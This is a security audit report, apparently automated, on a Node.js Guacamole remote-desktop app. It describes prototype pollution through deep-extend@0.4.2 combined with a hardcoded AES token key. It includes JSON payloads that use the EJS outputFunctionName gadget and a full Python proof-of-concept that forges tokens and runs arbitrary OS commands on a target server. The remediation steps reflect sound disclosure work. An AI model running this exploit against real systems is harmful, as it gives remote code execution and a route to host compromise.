# Vulnerability Report

**Target:** `chips/` (Node.js/Express web application for remote desktop via Guacamole)
**Bug classes:** prototype-pollution
**Languages:** JavaScript (Node.js)
**Date:** 2026-04-02 20:09:40 UTC

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 0 |
| Medium   | 0 |
| Low / Info | 0 |

---

## Findings

### 1. Prototype Pollution via `deep-extend@0.4.2` in Guacamole Token Decryption -- `prototype-pollution`

- **Severity:** Critical
- **Location:** `chips/node_modules/guacamole-lite/lib/ClientConnection.js:142-147` (sink), `chips/node_modules/deep-extend/lib/deep-extend.js:104-117` (vulnerable library)
- **Sink / pattern:** `DeepExtend(compiledSettings, ..., this.connectionSettings.connection.settings, ...)` where `connectionSettings` is parsed from an attacker-forged encrypted token

**Code (relevant excerpts):**

`ClientConnection.js` -- token decryption and merge:

```js
// line 25-29: user-controlled data enters from decrypted token
this.connectionSettings = this.decryptToken();
this.connectionType = this.connectionSettings.connection.type;
this.connectionSettings['connection'] = this.mergeConnectionOptions();

// line 132-149: mergeConnectionOptions deep-merges token data into a new object
mergeConnectionOptions() {
    let unencryptedConnectionSettings = {};
    Object.keys(this.query)
        .filter(key => this.server.clientOptions.allowedUnencryptedConnectionSettings[this.connectionType].includes(key))
        .forEach(key => unencryptedConnectionSettings[key] = this.query[key]);

    let compiledSettings = {};
    DeepExtend(
        compiledSettings,
        this.server.clientOptions.connectionDefaultSettings[this.connectionType],
        this.connectionSettings.connection.settings,  // <-- attacker-controlled
        unencryptedConnectionSettings
    );
    return compiledSettings;
}
```

`Crypt.js` -- token is decrypted and JSON-parsed:

```js
// line 9-21: decrypted string is passed to JSON.parse, which preserves __proto__ as own property
decrypt(encodedString) {
    let encoded = JSON.parse(this.constructor.base64decode(encodedString));
    encoded.iv = this.constructor.base64decode(encoded.iv);
    encoded.value = this.constructor.base64decode(encoded.value, 'binary');
    const decipher = Crypto.createDecipheriv(...);
    let decrypted = decipher.update(encoded.value, 'binary', 'ascii');
    decrypted += decipher.final('ascii');
    return JSON.parse(decrypted);  // __proto__ becomes an own enumerable key
}
```

`deep-extend.js` -- no `__proto__` guard:

```js
// line 104-117: iterates all own keys including __proto__, writes to target[key]
Object.keys(obj).forEach(function (key) {
    src = target[key];
    val = obj[key];
    if (val === target) { return; }
    else if (typeof val !== 'object' || val === null) {
        target[key] = val;  // for __proto__, target["__proto__"] = val sets Object.prototype
        return;
    }
    // ... for nested objects, recurses: deepExtend(Object.prototype, attacker_obj)
    else {
        target[key] = deepExtend(src, val);
        return;
    }
});
```

**Description:**

The application uses `guacamole-lite@0.6.3`, which depends on `deep-extend@0.4.2` (CVE-2018-3750). When a WebSocket client connects to the Guacamole endpoint, the `token` query parameter is decrypted and parsed via `JSON.parse`. The resulting object's `connection.settings` field is passed directly into `DeepExtend()` in `mergeConnectionOptions()`.

`JSON.parse` preserves `__proto__` as an own enumerable property, and `Object.keys()` returns it. Because `deep-extend@0.4.2` does not skip `__proto__` or `constructor` keys, when it processes `target["__proto__"] = deepExtend(src, val)`, `src` resolves to `Object.prototype` (via the getter on `__proto__`), and the recursive merge writes attacker-controlled properties directly onto `Object.prototype`.

This pollutes the prototype for **every object** in the Node.js process for the remainder of its lifetime.

**Attack prerequisites:**

The token must be encrypted with the AES-256-CBC key. The key is hardcoded in `settings/clientOptions.json` as `MySuperSecretKeyForParamsToken12` (committed to the repository). An attacker who can read the source (or exploit the path traversal in `/files/*` from the prior report) obtains the key and can forge arbitrary tokens.

**Malicious token payload (pre-encryption):**

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "__proto__": {
        "polluted": "true"
      }
    }
  }
}
```

After this token is processed, `({}).polluted === "true"` evaluates to `true` for every plain object in the process.

**Remediation:**

1. **Upgrade `deep-extend`** to `>=0.6.0`, which adds `__proto__` and `constructor` guards. Or replace with a safe merge utility.
2. **Upgrade `guacamole-lite`** to a version that pins a safe `deep-extend` version.
3. **Sanitize parsed token data** before passing to any merge function: strip `__proto__`, `constructor`, and `prototype` keys recursively from the decrypted JSON before using it.
4. **Rotate and externalize the encryption key** so tokens cannot be trivially forged.

---

## Exploit chain

### Chain: Hardcoded Key + Prototype Pollution + EJS Template Engine -> Remote Code Execution

- **Objective:** Remote code execution on the application server.
- **Prerequisites:** Network access to the application (no authentication required). Knowledge of the encryption key (hardcoded in repo, or readable via path traversal at `/files/....//....//settings/clientOptions.json`).

**Flow:**

1. **Step 1** (hardcoded-secrets): Attacker obtains the AES-256-CBC encryption key `MySuperSecretKeyForParamsToken12` from the repository source or via the path traversal vulnerability in `/files/*`.

2. **Step 2** (prototype-pollution, Finding #1): Attacker forges an encrypted token containing a `__proto__` payload targeting an EJS RCE gadget. EJS reads `opts.outputFunctionName` from the options object during template compilation. If `Object.prototype.outputFunctionName` is set to a string containing JavaScript code, EJS will inject it as a function name into the compiled template source and execute it.

   Malicious token payload (pre-encryption):

   ```json
   {
     "connection": {
       "type": "rdp",
       "settings": {
         "__proto__": {
           "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');x"
         }
       }
     }
   }
   ```

3. **Step 3** (RCE via EJS gadget): After the WebSocket connection processes the token and pollutes `Object.prototype.outputFunctionName`, the next HTTP request that triggers `res.render()` (any page: `/`, `/rdp`, or a 404) will cause EJS to compile a template using the polluted `outputFunctionName`. EJS inserts this value unsanitized into the template function source, which is then evaluated via `new Function(...)`, achieving arbitrary code execution as the Node.js process user.

**Result:** Remote code execution. The attacker can execute arbitrary OS commands on the server. Since the Docker socket is mounted into the container, this can be escalated to full host compromise.

**Feasibility:** Viable. Each component is confirmed from source:
- `deep-extend@0.4.2` has no prototype guard (verified in `deep-extend.js:104`)
- `JSON.parse` preserves `__proto__` as own enumerable key
- EJS `outputFunctionName` gadget is a well-documented prototype pollution to RCE vector
- The app uses EJS as one of its template engines (`app.js:17`, `package.json:39`)
- No authentication stands between the attacker and the WebSocket endpoint

---

## Proof of concept (Critical / High only)

### PoC: Prototype Pollution via Forged Token

The following Python script forges an encrypted token that pollutes `Object.prototype` when processed by the server. It then makes an HTTP request to trigger the EJS gadget for RCE.

```python
#!/usr/bin/env python3
"""
PoC: Prototype pollution to RCE via deep-extend@0.4.2 + EJS gadget in chips app.
Use only against targets you are authorized to test.
"""

import argparse
import json
import base64
import sys

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    print("Install pycryptodome: pip install pycryptodome", file=sys.stderr)
    sys.exit(1)

try:
    import requests
    import websocket
except ImportError:
    print("Install deps: pip install requests websocket-client", file=sys.stderr)
    sys.exit(1)

KEY = b"MySuperSecretKeyForParamsToken12"

# Step 1: Forge token with __proto__ pollution payload targeting EJS outputFunctionName
PAYLOAD = {
    "connection": {
        "type": "rdp",
        "settings": {
            "__proto__": {
                "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');x"
            }
        }
    }
}

def forge_token(payload_obj):
    from os import urandom
    iv = urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = json.dumps(payload_obj).encode("utf-8")
    encrypted = cipher.encrypt(pad(plaintext, AES.block_size))

    token_data = {
        "iv": base64.b64encode(iv).decode(),
        "value": base64.b64encode(encrypted).decode()
    }
    return base64.b64encode(json.dumps(token_data).encode()).decode()

def main():
    parser = argparse.ArgumentParser(description="PoC: Prototype pollution -> RCE via chips app")
    parser.add_argument("--target", required=True, help="Target base URL, e.g. http://localhost")
    parser.add_argument("--command", default="id > /tmp/pwned", help="OS command to execute")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    ws_url = base.replace("http://", "ws://").replace("https://", "wss://")

    # Update payload with user-specified command
    PAYLOAD["connection"]["settings"]["__proto__"]["outputFunctionName"] = (
        f"x;process.mainModule.require('child_process').execSync('{args.command}');x"
    )

    token = forge_token(PAYLOAD)
    print(f"[*] Forged token (first 60 chars): {token[:60]}...")

    # Step 2: Connect via WebSocket to trigger token decryption + DeepExtend pollution
    guac_ws = f"{ws_url}/guaclite?token={token}&width=1024&height=768"
    print(f"[*] Connecting to WebSocket: {guac_ws[:80]}...")
    try:
        ws = websocket.create_connection(guac_ws, timeout=5)
        print("[+] WebSocket connected -- prototype pollution triggered")
        ws.close()
    except Exception as e:
        print(f"[*] WebSocket closed/errored (expected): {e}")
        print("[*] Pollution may still have been applied before error")

    # Step 3: Trigger EJS render to execute the gadget
    print(f"[*] Triggering EJS render via GET {base}/ ...")
    try:
        r = requests.get(f"{base}/", timeout=10)
        print(f"[+] HTTP status: {r.status_code}")
        print(f"[+] If RCE succeeded, check /tmp/pwned on the target")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    main()
```

**Verification:** After running the PoC, check `/tmp/pwned` on the target container for the output of the `id` command. If the file exists with the process user's identity, RCE is confirmed.

To build and iterate on this PoC against your test environment, provide the target URL and any adjustments needed (e.g., different command, auth details).
